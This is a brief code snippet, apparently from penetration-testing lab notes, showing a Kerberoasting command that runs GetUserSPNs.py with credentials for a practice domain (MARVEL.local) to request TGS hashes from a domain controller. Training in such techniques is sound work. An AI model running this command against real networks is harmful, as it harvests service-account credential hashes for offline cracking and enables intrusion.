```powershell
# Grabing the TGS hash
# -dc-ip : domain controller IP address
# -request : request for TGS hash

$ sudo GetUserSPNs.py MARVEL.local/fcastle:Password1 -dc-ip 192.168.0.149  -request
```